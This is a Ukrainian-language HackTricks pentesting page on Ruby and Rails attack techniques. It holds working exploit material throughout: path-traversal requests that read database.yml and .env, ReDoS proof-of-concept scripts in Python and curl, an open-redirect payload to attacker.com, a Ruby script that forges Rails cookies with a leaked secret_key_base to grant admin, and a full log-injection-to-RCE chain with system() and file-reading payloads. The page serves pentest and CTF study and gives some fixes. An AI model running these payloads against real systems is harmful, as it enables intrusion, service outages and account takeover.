# Хитрощі Ruby

{{#include ../../banners/hacktricks-training.md}}

## Завантаження файлу для RCE

Як пояснено в [this article](https://www.offsec.com/blog/cve-2024-46986/), завантаження файлу `.rb` у чутливі каталоги, такі як `config/initializers/`, може призвести до віддаленого виконання коду (RCE) в Ruby on Rails додатках.

Поради:
- Інші місця boot/eager-load, які виконуються при старті додатку, також небезпечні, якщо вони доступні для запису (наприклад, `config/initializers/` — класичний приклад). Якщо ви знайдете довільне завантаження файлу, яке потрапляє куди-небудь під `config/` і потім буде виконано або підключено через `require`, ви можете отримати RCE при завантаженні.
- Шукайте dev/staging збірки, які копіюють керовані користувачем файли в образ контейнера, звідки Rails завантажить їх при старті.

## Active Storage image transformation → command execution (CVE-2025-24293)

Якщо застосунок використовує Active Storage з `image_processing` + `mini_magick` та передає ненадійні параметри в методи трансформації зображень, версії Rails до 7.1.5.2 / 7.2.2.2 / 8.0.2.1 могли дозволяти command injection, оскільки деякі методи трансформації помилково були дозволені за замовчуванням.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- What to try during testing
- Знайдіть кінцеві точки, які приймають опції variant/processing, назви трансформацій або довільні аргументи ImageMagick.
- Фазьте `params[:t]` і `params[:v]` на предмет підозрілих помилок або побічних ефектів виконання. Якщо ви можете впливати на ім'я методу або передати сирі аргументи, які доходять до MiniMagick, це може призвести до виконання коду на хості обробки зображень.
- Якщо у вас є лише доступ для читання згенерованих варіантів, спробуйте blind exfiltration через спеціально сформовані операції ImageMagick.

- Усунення/виявлення
- Якщо ви бачите Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 з Active Storage + `image_processing` + `mini_magick` і трансформаціями, контрольованими користувачем, вважайте це експлуатованим. Рекомендуйте оновлення та застосування суворих allowlists для методів/параметрів і жорсткої політики ImageMagick.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Якщо цільовий стек використовує Rack middleware напряму або через фреймворки, версії `rack` до 2.2.13, 3.0.14 і 3.1.12 дозволяють Local File Inclusion через `Rack::Static`, коли `:root` не вказаний або неправильно налаштований. Закодований traversal у `PATH_INFO` може відкрити файли з робочого каталогу процесу або з несподіваного кореня.

- Шукайте додатки, які підключають `Rack::Static` в `config.ru` або в стеку middleware. Спробуйте закодовані traversals проти статичних шляхів, наприклад:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Підлаштуйте префікс під налаштовані `urls:`. Якщо додаток відповідає вмістом файлу, ймовірно у вас LFI до будь-чого під вирішеним `:root`.

- Усунення: оновіть Rack; переконайтесь, що `:root` вказує лише на директорію з публічними файлами і явно встановлений.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` і < `2.2.8.1` витрачав надлінійний час на розбір спеціально сформованих заголовків `Content-Type: multipart/form-data`. Один POST з гігантським списком параметрів `A=` може зависити воркер Puma/Unicorn і спричинити DoS або виснаження черги запитів.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Працює проти будь-якого стека на базі Rack (Rails/Sinatra/Hanami/Grape). Якщо спереду nginx/haproxy з keep-alive, повторіть паралельно, щоб виснажити воркери.
- Виправлено шляхом приведення парсеру до лінійного; перевіряйте `rack` gem версії < `3.0.9.1` або < `2.2.8.1`. У звітах вкажіть, що WAFи рідко блокують це, оскільки заголовок синтаксично валідний.

## REXML XML parser ReDoS (CVE-2024-49761)

Гем REXML < 3.3.9 (Ruby 3.1 і раніші) катастрофічно повертається назад при розборі hex numeric character references, що містять довгі послідовності цифр (наприклад, `&#1111111111111x41;`). Будь-який XML, оброблений REXML або бібліотеками-обгортками (SOAP/XML API clients, SAML, SVG uploads), може бути зловживаний для виснаження CPU.

Мінімальний тригер проти Rails endpoint, який парсить XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Якщо процес залишається зайнятим протягом кількох секунд і CPU воркера різко зростає, ймовірно, він вразливий. Атака має низьку пропускну здатність і також впливає на фонoві задачі, які інжестять XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Додатки, що використовують gem `cgi` (за замовчуванням у багатьох Rack-стеках), можна заморозити одним шкідливим заголовком:
- `CGI::Cookie.parse` поводився суперлінійно; величезні рядки cookie (тисячі роздільників) викликають поведінку O(N²).
- Регекс `CGI::Util#escapeElement` дозволяв ReDoS під час HTML-ескейпінгу.

Обидві проблеми виправлені в `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Для pentests встановіть величезний заголовок `Cookie:` або подавайте ненадійний HTML у допоміжний код і спостерігайте за зависанням воркера. Поєднайте з keep-alive, щоб посилити ефект.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

Gem `googlesign_in` < 1.3.0 (використовується для Google OAuth у Rails) виконувала неповну перевірку same-origin для параметра `proceedto`. Неправильно сформований URL, наприклад `proceedto=//attacker.com/%2F..`, обходить перевірку і перенаправляє користувача на сторонній сайт, зберігаючи Rails flash/session cookies.

Exploit flow:
1. Жертва клікає по підробленому посиланню Google Sign-In, розміщеному атакуючим.
2. Після автентифікації gem перенаправляє на домен, контрольований атакуючим, спричиняючи leak flash notices або будь-які дані, що збережені в cookie, scoped до wildcard-домену.
3. Якщо додаток зберігає короткоживучі токени або magic links у flash, це можна використати для account takeover.

Під час тестування зробіть grep Gemfile.lock на `googlesign_in` < 1.3.0 і спробуйте некоректні значення `proceedto`. Підтвердіть через заголовок Location та відображення cookie.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails шифрує і підписує cookies за допомогою ключів, похідних від `secret_key_base`. Якщо це значення leaks (наприклад, у репозиторії, логах або через некоректно налаштовані credentials), зазвичай можна decrypt, змінити і re-encrypt cookies. Це часто призводить до обходу authz, якщо додаток зберігає ролі, user IDs або feature flags у cookie.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Примітки:
- Старіші додатки можуть використовувати AES-256-CBC та соли `encrypted cookie` / `signed encrypted cookie`, або серіалізатори JSON/Marshal. Відрегулюйте солі, шифр та серіалізатор відповідно.
- У разі компрометації/під час оцінки — змініть `secret_key_base`, щоб скасувати дію всіх існуючих cookies.

## Див. також (Ruby/Rails-специфічні вразливості)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Ін'єкція логів → RCE via Ruby `load` and `Pathname.cleanpath` (path smuggling)

Коли додаток (часто простий Rack/Sinatra/Rails endpoint) одночасно:
- записує у лог рядок, керований користувачем, дослівно, та
- пізніше `load`'ить файл, шлях до якого походить із того самого рядка (після `Pathname#cleanpath`),

Часто можна досягти віддаленого виконання коду, отруївши лог і змусивши додаток `load` файл логу. Ключові примітиви:

- Ruby `load` виконує вміст цільового файлу як Ruby незалежно від розширення файлу. Будь-який читаємий текстовий файл, вміст якого парситься як Ruby, буде виконаний.
- `Pathname#cleanpath` згортає сегменти `.` і `..` без звернення до файлової системи, що дозволяє path smuggling: дані, контрольовані атакуючим, можна додати попереду для логування, тоді як очищений шлях все ще вказуватиме на потрібний файл для виконання (наприклад, `../logs/error.log`).

### Мінімальний вразливий шаблон
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Чому log може містити валідний Ruby
`Logger` записує префіксні рядки, наприклад:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
У Ruby `#` позначає початок коментаря, а `9/2/2025` — це просто арифметика. Щоб інжектувати валідний Ruby-код, потрібно:
- Почати ваш payload з нового рядка, щоб він не був закоментований `#` у рядку INFO; надішліть ведучий символ нового рядка (`\n` або `%0A`).
- Закрити звисаючу `[` яку додав рядок INFO. Поширений трюк — почати з `]` і за потреби задовольнити парсер `][0]=1`.
- Потім помістити довільний Ruby-код (наприклад, `system(...)`).

Приклад того, що опиниться в логах після одного запиту з crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Сховування одного рядка, який одночасно записує код у лог і перетворюється на шлях логу
Нам потрібен один attacker-controlled рядок, який:
- при записі у лог у сирому вигляді містить наш Ruby payload, і
- при передачі через `Pathname.new(<input>).cleanpath` перетворюється на `../logs/error.log`, тож наступний `load` виконає щойно отруєний лог-файл.

`Pathname#cleanpath` ігнорує схеми та згортає компоненти обходу, тому наступне працює:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Символ `#` перед `://` гарантує, що Ruby ігнорує хвіст при виконанні логу, тоді як `cleanpath` все ще скорочує суфікс до `../logs/error.log`.
- Провідний символ нового рядка виходить з INFO-рядка; `]` закриває підвислу дужку; `][0]=1` задовольняє парсер.

### Експлуатація від початку до кінця
1. Надішліть наступний рядок як ім'я скрипта резервної копії (за потреби URL-кодуйте перший перенос рядка як `%0A`):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Додаток записує ваш сирий рядок у `logs/error.log`.
3. Додаток обчислює `cleanpath`, який в результаті дає `../logs/error.log`, і викликає `load` для нього.
4. Ruby виконує код, який ви вставили в лог.

Щоб ексфільтрувати файл у середовищі, схожому на CTF:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-кодований PoC (перший символ — новий рядок):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Посилання

- [Оголошення безпеки Rails: CVE-2025-24293 — Active Storage небезпечні методи трансформації (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Документація Ruby Pathname.cleanpath](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Як працює load у Ruby](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Оповіщення щодо Rack multipart ReDoS (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Повідомлення про безпеку Ruby щодо CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
